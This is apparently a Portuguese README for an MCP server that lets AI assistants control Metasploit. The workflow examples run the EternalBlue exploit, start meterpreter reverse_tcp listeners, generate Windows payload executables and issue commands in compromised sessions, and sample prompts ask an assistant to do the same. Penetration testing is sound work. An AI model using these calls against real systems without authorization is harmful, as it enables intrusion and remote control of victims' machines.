# Servidor MCP Metasploit

Um servidor MCP (Model Context Protocol) para integração com o Metasploit Framework no Kali Linux.

## Descrição

Este servidor MCP fornece uma ponte entre modelos de linguagem como o Claude e a plataforma de teste de penetração Metasploit Framework. Permite que assistentes de IA acessem e controlem dinamicamente as funcionalidades do Metasploit através de ferramentas padronizadas, habilitando uma interface de linguagem natural para fluxos de trabalho complexos de testes de segurança.

## Funcionalidades

### Informações de Módulos

- **list_exploits**: Buscar e listar módulos de exploit disponíveis no Metasploit
- **list_payloads**: Buscar e listar módulos de payload disponíveis com filtragem opcional por plataforma e arquitetura

### Fluxo de Exploração

- **run_exploit**: Configurar e executar um exploit contra um alvo com opções para executar verificações primeiro
- **run_auxiliary_module**: Executar qualquer módulo auxiliar do Metasploit com opções customizadas
- **run_post_module**: Executar módulos pós-exploração contra sessões existentes

### Geração de Payloads

- **generate_payload**: Gerar arquivos de payload usando RPC do Metasploit (salva arquivos localmente)

### Gerenciamento de Sessões

- **list_active_sessions**: Mostrar sessões atuais do Metasploit com informações detalhadas
- **send_session_command**: Executar um comando em uma sessão shell ou Meterpreter ativa
- **terminate_session**: Finalizar forçadamente uma sessão ativa

### Gerenciamento de Handlers

- **list_listeners**: Mostrar todos os handlers ativos e jobs em background
- **start_listener**: Criar um novo multi/handler para receber conexões
- **stop_job**: Terminar qualquer job ou handler em execução

## Pré-requisitos

- Metasploit Framework instalado e msfrpcd em execução
- Kali Linux (ou distribuição baseada em Debian)
- Python 3.10 ou superior
- Pacotes Python necessários (veja requirements.txt)

## Instalação

### 1. Preparar o Sistema

```bash
# Atualizar sistema (Kali Linux)
sudo apt update && sudo apt upgrade -y

# Verificar se Metasploit está instalado
msfconsole --version

# Se não estiver instalado:
sudo apt install metasploit-framework

# Verificar Python
python3 --version
2. Configurar o Projeto
bash
# Clonar repositório
git clone https://github.com/seu-usuario/metasploit-mcp-server.git
cd metasploit-mcp-server

# Criar ambiente virtual
python3 -m venv venv

# Ativar ambiente virtual
source venv/bin/activate

# Instalar dependências
pip install -r requirements.txt
3. Configurar Variáveis de Ambiente (opcional)
bash
# Criar arquivo .env ou exportar variáveis
export MSF_PASSWORD=suasenha
export MSF_SERVER=127.0.0.1
export MSF_PORT=55553
export MSF_SSL=false
export PAYLOAD_SAVE_DIR=/home/kali/payloads  # Opcional: onde salvar payloads gerados
Uso
Iniciar o Serviço RPC do Metasploit
bash
# Iniciar msfrpcd (deixe rodando em um terminal)
msfrpcd -P suasenha -S -a 127.0.0.1 -p 55553
Opções de Transporte
O servidor suporta dois métodos de transporte:

HTTP/SSE (Server-Sent Events): Modo padrão para interoperabilidade com a maioria dos clientes MCP
STDIO (Standard Input/Output): Usado com Claude Desktop e conexões diretas similares
Você pode selecionar explicitamente o modo de transporte usando a flag --transport:

bash
# Executar com transporte HTTP/SSE (padrão)
python MetasploitMCP.py --transport http

# Executar com transporte STDIO
python MetasploitMCP.py --transport stdio
Opções adicionais para modo HTTP:

bash
python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
Integração com Claude Desktop
Para integração com Claude Desktop, configure o arquivo ~/.config/Claude/claude_desktop_config.json:

json
{
    "mcpServers": {
        "metasploit": {
            "command": "/home/kali/caminho/para/metasploit-mcp-server/venv/bin/python",
            "args": [
                "/home/kali/caminho/para/metasploit-mcp-server/MetasploitMCP.py",
                "--transport",
                "stdio"
            ],
            "env": {
                "MSF_PASSWORD": "suasenha"
            }
        }
    }
}
Outros Clientes MCP
Para outros clientes MCP que usam HTTP/SSE:

Iniciar o servidor em modo HTTP:
bash
python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
Configurar seu cliente MCP para conectar em:
Endpoint SSE: http://seu-servidor-ip:8085/sse
Considerações de Segurança
⚠️ AVISO IMPORTANTE DE SEGURANÇA:

Esta ferramenta fornece acesso direto às capacidades do Metasploit Framework, que incluem recursos poderosos de exploração. Use com responsabilidade e apenas em ambientes onde você tem permissão explícita para realizar testes de segurança.

Sempre valide e revise todos os comandos antes da execução
Execute apenas em ambientes de teste segregados ou com autorização adequada
Esteja ciente de que comandos pós-exploração podem resultar em modificações significativas do sistema
Exemplos de Fluxos de Trabalho
Exploração Básica
Listar exploits disponíveis: list_exploits("ms17_010")
Selecionar e executar exploit: run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})
Listar sessões: list_active_sessions()
Executar comandos: send_session_command(1, "whoami")
Pós-Exploração
Executar módulo post: run_post_module("windows/gather/enum_logged_on_users", 1)
Enviar comandos customizados: send_session_command(1, "sysinfo")
Finalizar quando terminar: terminate_session(1)
Gerenciamento de Handler
Iniciar listener: start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)
Listar handlers ativos: list_listeners()
Gerar payload: generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})
Parar handler: stop_job(1)
Exemplos de Uso com Claude Desktop
Comandos em Linguagem Natural
"Liste exploits relacionados ao SMB"
"Execute o exploit MS17-010 contra o host 192.168.1.100"
"Mostre as sessões ativas"
"Execute o comando 'systeminfo' na sessão 1"
"Gere um payload reverse TCP para Windows x64"
"Inicie um listener na porta 4444"
Fluxo Completo de Pentesting
"Busque exploits para Windows SMB e execute contra 192.168.1.50 usando um payload meterpreter reverse TCP no meu IP 192.168.1.10 porta 4444"

"Liste as sessões ativas e execute 'getuid' na primeira sessão"

"Execute o módulo de enumeração de usuários logados na sessão ativa"

"Gere um payload executável Windows x64 com LHOST 192.168.1.10 e LPORT 5555"
Testes
Este projeto inclui testes unitários e de integração abrangentes para garantir confiabilidade e manutenibilidade.

Pré-requisitos para Testes
Instalar dependências de teste:

bash
pip install -r requirements-test.txt
Ou usar o instalador conveniente:

bash
python run_tests.py --install-deps
# OU
make install-deps
Executar Testes
Comandos Rápidos
bash
# Executar todos os testes
python run_tests.py --all
# OU
make test

# Executar com relatório de cobertura
python run_tests.py --all --coverage
# OU
make coverage

# Executar com relatório HTML de cobertura
python run_tests.py --all --coverage --html
# OU
make coverage-html
Suítes de Teste Específicas
bash
# Apenas testes unitários
python run_tests.py --unit
# OU
make test-unit

# Apenas testes de integração
python run_tests.py --integration
# OU
make test-integration

# Testes de parsing de opções
python run_tests.py --options
# OU
make test-options

# Testes de funções auxiliares
python run_tests.py --helpers
# OU
make test-helpers

# Testes de ferramentas MCP
python run_tests.py --tools
# OU
make test-tools
Opções de Configuração
Diretório de Salvamento de Payloads
Por padrão, payloads gerados com generate_payload são salvos em um diretório payloads na sua pasta home (~/payloads). Você pode personalizar esta localização definindo a variável de ambiente PAYLOAD_SAVE_DIR.

Definindo a variável de ambiente:

bash
# No terminal (temporário)
export PAYLOAD_SAVE_DIR=/home/kali/meus-payloads

# No arquivo ~/.bashrc (permanente)
echo 'export PAYLOAD_SAVE_DIR=/home/kali/meus-payloads' >> ~/.bashrc
source ~/.bashrc

# Na configuração do Claude Desktop:
json
"env": {
    "MSF_PASSWORD": "suasenha",
    "PAYLOAD_SAVE_DIR": "/home/kali/meus-payloads"
}
Nota: Se você especificar um caminho customizado, certifique-se de que ele existe ou que a aplicação tem permissão para criá-lo. Se o caminho for inválido, a geração de payload pode falhar.

Solução de Problemas
msfrpcd não inicia
bash
# Verificar se a porta está em uso
sudo netstat -tlnp | grep 55553

# Matar processo se necessário
sudo pkill msfrpcd

# Iniciar novamente
msfrpcd -P suasenha -S -a 127.0.0.1 -p 55553
Erro de conexão
bash
# Verificar se o serviço está rodando
ps aux | grep msfrpcd

# Testar conexão manualmente
telnet 127.0.0.1 55553
Permissões de diretório
bash
# Criar diretório de payloads com permissões adequadas
mkdir -p ~/payloads
chmod 755 ~/payloads
Compatibilidade
Metasploit Framework: 6.0+
Kali Linux: 2023.1+
Python: 3.10+
Claude Desktop: Versões com suporte MCP
Licença
Apache 2.0

Contribuindo
Faça fork do projeto
Crie uma branch para sua feature (git checkout -b feature/nova-funcionalidade)
Commit suas mudanças (git commit -am 'Adiciona nova funcionalidade')
Push para a branch (git push origin feature/nova-funcionalidade)
Abra um Pull Request
Links Relacionados
Metasploit Framework
Model Context Protocol
Claude Desktop
Kali Linux
